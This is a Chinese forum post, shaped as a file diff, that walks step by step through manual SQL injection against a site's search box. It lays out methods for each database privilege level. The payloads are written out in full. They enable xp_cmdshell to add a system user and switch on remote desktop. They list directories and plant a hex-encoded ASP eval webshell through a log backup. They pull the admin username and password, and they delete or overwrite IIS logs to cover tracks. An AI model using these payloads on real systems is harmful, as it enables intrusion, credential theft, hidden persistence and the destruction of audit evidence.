@@ -1,0 +1,173 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+总结搜索型手工注入的全过程（不同权限下的方法）
+D8888D主贴内容-------------------------------------------------------
+ 
+
+author:鸿鸿
+
+本人是小菜，水平有限，但是为了论坛做贡献，还是自己写点原创的东西出来吧。希望大牛看了别笑就好了。。。。
+=======================================================
+前段时间朋友丢了一个站过来，说是他们学校的。叫我帮忙检测下。
+于是看了下。用扫描器扫了下，没有啥可以上传利用的，发现后台，默认和万能密码无效，
+无注入点，手工和工具试过了，防注入，COOKIES注入也不行。找不到程序源码，没办法分析。旁注 ？
+整站是独立服务器，就一个站，旁注也没办法。难到要C段？好麻烦哦。丢给群里一些大牛看看，
+都说搞不定（应该是没认真看吧。），我大受打击，但是我不放弃，再去看看先。
+于是，发现了一个搜索框，直觉告诉我，这就是突破点，果然.....
+
+前段时间的事情了，没办法截图。
+整个过程做了简单的笔记，和搜集了一些手工注入的代码。凑合着看吧。
+
+
+首先，简单的判断搜索型注入漏洞存在不存在的办法是先搜索，如果出错，说明90%存在这个漏洞。
+
+a%' and 1=1-- 正常
+a%' and 1=2-- 错误
+
+有注入
+
+由于网站过滤了 ' 等等的。所以工具不行，要手工了。累人啊~~~
+
+判断权限
+a%' and (select is_member('dbo'))=1--    返回正常则 sa
+a%' and (select is_member('db_owner'))=1--   返回正常则 DB
+都不是那就只有一种可能啦，public，权限貌似很小。
+
+也可以用另一种命令来判断权限
+a%' and 1=(Select IS_SRVROLEMEMBER('sysadmin'));-- sa
+a%' and 1=(Select IS_MEMBER('db_owner'));-- DB
+======================================================================================
+sa 的方法。直接建立系统帐号密码。登陆3389.
+
+
+命令是 
+a%';exec master..xp_cmdshell"net user admins 123456 /add"--
+
+如果 'xp_cmdshell' 被关闭了。就来开启他。
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;reconfigure
+最后这个为1是开启.为0是关闭.
+a%' ;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXECsp_configure 'xp_cmdshell', 1;RECONFIGURE--
+
+
+如果不开3389
+
+下面的命令。。
+
+a%';exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--
+
+======================================================================================
+db 的方法
+
+主要思路是列目录-差异备份 还有需要库名。想办法弄出来。
+
+首先列目录
+
+a%' order by XX-- 自己猜 例如 12
+
+然后
+
+a%' and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12--
+
+找到字符类型的，能显示出来的 比如 5
+
+《MSSQL手工注入目录查找辅助工具》这个自己百度去哈。。。
+
+用 天阳的《MSSQL手工注入目录查找辅助工具》 生成列目录的代码 现在例如生成的是C盘的
+
+然后
+
+a%' ;drop table t_tian6 create table t_tian6(fn nvarchar(4000),d int,f int) declare @root nvarchar(4000) set @root=0x43003A00 insert into t_tian6 exec master..xp_dirtree @root,1,1 update t_tian6 set fn=fn+char(92) where f=0 drop table t_tian6_1 create tabLe t_tian6_1(f nvarchar(4000))-- //建立插入表数据
+
+然后
+
+a%' ;declare @fn nvarchar(400),@f int,@r nvarchar(4000) set @r=char(9) declare cr cursor for select fn,f from t_tian6 order by f,fn open cr fetch cr into @fn,@f while @@fetch_status=0 begin set @r=@r+@fn+char(9) fetch cr into @fn,@f end close cr deallocate cr insert intO t_tian6_1(f) values(@r)-- //远程整理
+
+
+然后
+
+a%' and 1=2 union select 1,2,3,4,(select top 1 f from t_tian6_1),6,7,8,9,10,11,12--
+
+获取结果。就显示出来路径了。
+
+接下来就是 继续 用 《MSSQL手工注入目录查找辅助工具》生成列目录的代码，按照上面的步骤来做， 获取路径。。。直到找到网站根目录。
+
+然后再获取库名
+
+命令：
+
+a%' and 1=2 union select 1,2,3,4,(select db_name()),6,7,8,9,10,11,12--
+
+and (select db_name())>0 是查询库名的。这里直接在里面显示。 //and user>0 查看当前用户的。这里貌似没什么用，应该不需要，但是平时注入的时候很常用。
+
+接下来就是 差异备份一句话木马了。
+
+这里用LOG 5步备份法。最后 如果拿到权限后，最好把 备份的东西给删除了吧。
+
+代码是
+
+a%';alter database 库名 set RECOVERY FULL--
+
+a%';create table cmd (a image)--
+
+a%';backup log 库名 to disk = 'c:\backuplog.bak' with init--
+
+a%';insert into cmd (a) values (0x3C256576616C20726571756573742822612229253E)--
+
+a%';backup log 库名 to disk = 'D:/****/a.asp'-- //路径就填刚才获取到的
+
+
+0x3C256576616C20726571756573742822612229253E = 一句话木马 =<%eval(request("a"))%>
+
+库名 是刚才查询到的。自己填。
+
+然后就是用一句话上去连。OK。成功了。
+
+======================================================================================
+public权限的又改如何拿？
+
+那就只好查管理员的帐号密码 然后 登陆后台拿webshell了。
+
+
+a%' order by XX 自己猜 例如 12
+
+然后
+
+a%' and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12--
+
+猜表
+
+a%' and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12 from admin-- // 猜他是admin 返回正常则有,不正常的话，就试其他的比如：manage user 等等
+
+a%' and 1=2 union select 1,2,3,4,username,password,7,8,9,10,11,12 from admin--
+
+猜帐号密码
+
+2个字段 一个 username 一个 password 。返回正常则 会显示管理员帐号密码的。
+不对的话，就试试别的字段。
+
+然后就是登陆后台，拿webshell了。
+
+======================================================================================
+清除日志：
+
+删除：
+a%';exec master..xp_cmdshell"del C:\winnt\system32\logfiles\W3SVC1\ex090127.log"--
+
+覆盖：(推荐)
+a%';exec master..xp_cmdshell"copy C:\winnt\system32\logfiles\W3SVC1\ex090201.log C:\winnt\system32\logfiles\W3SVC1\ex100201.log"--
+
+按照系统的不同而自己改路径。
+======================================================================================
+备注：
+如果在搜索框内字数被限制了。就点查看源文件，找到 
+<input type="text" name="keyword" size=10 value="无关键字" maxlength="50">
+
+把文本框内的 
+maxlength值改的大一些。
+比如
+<input type="text" name="keyword" size=10 value="无关键字" maxlength="1000000">
+然后保存到本地提交。
+
+就不会限制到了。呵呵。我就不信你能输入命令超过这个数。
+好像有点多余，呵呵。
